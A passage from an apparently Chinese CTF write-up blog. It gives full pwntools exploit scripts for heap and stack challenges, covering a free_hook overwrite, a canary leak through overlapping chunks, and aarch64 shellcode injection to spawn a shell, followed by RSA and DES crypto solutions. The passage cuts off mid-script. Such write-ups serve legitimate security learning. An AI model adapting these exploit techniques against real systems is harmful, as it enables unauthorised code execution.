class="number">5</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  <span class="comment"># dequeue 2</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sh.sendline(p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="dinner-text"><a href="#dinner-text" class="headerlink" title="dinner_text"></a>dinner_text</h2><p>本题看上去像是传统低能堆题，但实际上我设计的是一个栈题</p>
<p>漏洞：change_name函数中，有脏数据，输入名字长度时存在整数下溢，可以通过下溢实现栈溢出；栈溢出后可以修改栈上名字长度，由于会将名字长度末尾修改为00，相当于实现任意写00</p>
<p>我出这题本来是拙劣模仿corctf上的一道题，那道题是线程下逐字节修改tls结构体绕过canary，我觉得非常有意思。我本来也是想逐字节修改tls本体中canary的，结果qemu下很妙竟然tls不可写，我只能另寻思路了（反正随便写00怎么打都行）</p>
<p>我的思路（未必简单）</p>
<p>1.脏数据泄露栈地址</p>
<p>2.堆没有清空，堆地址libc地址可以直接泄露</p>
<p>3.堆风水一下，让堆上的info_chunk的chunk0指针直接变成一个与info_chunk重叠的fake_chunk，这时fake_chunk的size恰好是info_chunk内可控的，我们伪造fake_chunk的size然后释放，下次add时我们就能控制info_chunk</p>
<p>4.我们控制info_chunk的一个指针为tls中的canary（栈上的也可以），就可以读取canary</p>
<p>5.栈溢出，qemuNX假的可以直接shellcode</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru         = <span class="keyword">lambda</span> a: 	io.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:		io.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b: 	io.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b: 	io.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a: 	io.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a: 	io.send(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s,addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;qemu-aarch64 -L ./ -g 8888 pwn&#x27;, shell=True)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;qemu-aarch64 -L ./ pwn&#x27;, shell=True)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;eat&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">&#x27;order:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;of name&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;name:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">change_name(<span class="number">28</span>, <span class="string">b&#x27;n1co5in3&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;n1co5in3&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">leak_stack = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>, leak_stack)</span><br><span class="line">stack_addr = leak_stack - <span class="number">0x50</span></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap and libc</span></span><br><span class="line">add(<span class="number">0x600</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x600</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x600</span>, shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x600</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x600</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">leak_heap = u64((r(<span class="number">3</span>) +<span class="string">b&#x27;\0\x55&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;leak_heap&#x27;</span>, leak_heap)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_libc = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base = leak_libc - (<span class="number">0x00000055019f0b48</span> - <span class="number">0x550185c000</span>) <span class="comment"># libc base: 0x550185c000</span></span><br><span class="line">stack_guard = libc_base - (<span class="number">0x550185c000</span> - <span class="number">0x5501858000</span>)</span><br><span class="line">lg(<span class="string">&#x27;leak_libc&#x27;</span>, leak_libc)</span><br><span class="line">lg(<span class="string">&#x27;stack_guard&#x27;</span>, stack_guard)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 00 poison to attack chunk 0, make chunk0 a fake chunk, then delete it</span></span><br><span class="line"><span class="comment"># then the fake chunk can be used overlapped with the chunk info</span></span><br><span class="line"><span class="comment"># we can use it to read canary from tls right before libc image </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">0x600</span>, <span class="string">b&#x27;padding&#x27;</span>) <span class="comment"># fake chunk size</span></span><br><span class="line"></span><br><span class="line">heap_base = leak_heap - <span class="number">0x370</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x691</span>)</span><br><span class="line">sla(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - stack_addr + (heap_base + <span class="number">0x2a0</span>))</span><br><span class="line">change_name(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x680</span>, p64(stack_guard + <span class="number">1</span>) + p64(<span class="number">16</span>))</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">ru(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x661</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\0&#x27;</span>+ r(<span class="number">7</span>))</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>, canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack overflow with shellcode(NX in qemu is fake)</span></span><br><span class="line">sla(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">change_name(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(canary) + p64(heap_base + <span class="number">0xfa0</span>)*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">s(<span class="string">&#x27;pwn!&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="equiv"><a href="#equiv" class="headerlink" title="equiv"></a>equiv</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line">c = (<span class="built_in">pow</span>(g, p, n * n) * <span class="built_in">pow</span>(m, n, n * n)) % (n * n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;<span class="built_in">str</span>(n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">pow</span>(m, n, n*n))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = </span></span><br><span class="line"><span class="comment"># n = </span></span><br><span class="line"><span class="comment"># hint = </span></span><br></pre></td></tr></table></figure>

<p>简单同余推导</p>
<p>$$g &#x3D; n + 1$$<br>$$g^p &#x3D; (n + 1)^p &#x3D; \sum_{r &#x3D; 0}^{p}C_p^r 1^{p-r} n^r$$<br>$$g^p \equiv 1 + pn \bmod n^2$$<br>$$hint &#x3D; m^n \bmod n^2$$<br>$$c &#x3D; g^pm^n \bmod n^2$$<br>$$g^p \equiv c \cdot hint^{-1} \equiv1+pn \bmod n^2$$<br>$$p &#x3D; \frac{g^p-1}{n}$$</p>
<p>solve</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">hint = </span><br><span class="line">inv = inverse(hint, n * n)</span><br><span class="line"></span><br><span class="line">gpnn = (c * inv) % (n * n)</span><br><span class="line">p = (gpnn - <span class="number">1</span>) // n</span><br><span class="line">q = n // p</span><br><span class="line">m = <span class="built_in">pow</span>(hint, inverse(n, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)), n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p><a target="_blank" rel="noopener" href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p>
<p>solve</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q1 = getPrime(<span class="number">600</span>)</span><br><span class="line">p2 = nextprime(p1 + getPrime(<span class="number">600</span>))</span><br><span class="line">q2 = getPrime(<span class="number">600</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">N1 = </span><br><span class="line">N2 = </span><br><span class="line">cipher1 = </span><br><span class="line">cipher2 = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">abs</span>(p1 - p2) &lt; p1 / (<span class="number">2</span> * <span class="number">2</span> * q1 * q2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t_cf</span>(<span class="params">n, d</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        res.append(n // d)</span><br><span class="line">        n, d = d, n % d</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cf</span>(<span class="params">sub_res</span>):</span><br><span class="line">    n, d = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:</span><br><span class="line">        d, n = n, i * n + d</span><br><span class="line">    <span class="keyword">return</span> d, n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = t_cf(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(cf, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _q2, _q1 <span class="keyword">in</span> list_fraction(N1, N2):</span><br><span class="line">    <span class="keyword">if</span> _q1 <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> N1 % _q1 == <span class="number">0</span>:</span><br><span class="line">        res, is_exact = gmpy2.iroot(N1 // _q1, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_exact:</span><br><span class="line">            _p1 = res</span><br><span class="line">            _p2 = gmpy2.iroot(N2 // _q2, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        phi1 = _p1 * (_p1 - <span class="number">1</span>) * (_q1 - <span class="number">1</span>)</span><br><span class="line">        phi2 = _p2 * (_p2 - <span class="number">1</span>) * (_q2 - <span class="number">1</span>)</span><br><span class="line">        d1 = inverse(e, phi1)</span><br><span class="line">        d2 = inverse(e, phi2)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(cipher1, d1, N1)) +</span><br><span class="line">              long_to_bytes(<span class="built_in">pow</span>(cipher2, d2, N2)))</span><br></pre></td></tr></table></figure>

<h2 id="leakDES"><a href="#leakDES" class="headerlink" title="leakDES"></a>leakDES</h2><p>DES 子密钥泄露</p>
<p>solve</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">key10 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">PC1 = [</span><br><span class="line">    <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>,</span><br><span class="line">    <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>,</span><br><span class="line">    <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">]</span><br><span class="line">PC2 = [</span><br><span class="line">    <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">33</span>, <span class="number">52</span>, <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line">movenum = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]  <span class="comment"># 对应16轮中每一轮的循环左移位数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRE_PC2</span>():</span><br><span class="line">    RE_PC2 = [-<span class="number">1</span>] * <span class="number">56</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC2:</span><br><span class="line">        RE_PC2[i] = i</span><br><span class="line">    <span class="keyword">return</span> RE_PC2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPC1_DiscardedBits</span>():</span><br><span class="line">    temp = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC1:</span><br><span class="line">        temp.remove(i)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 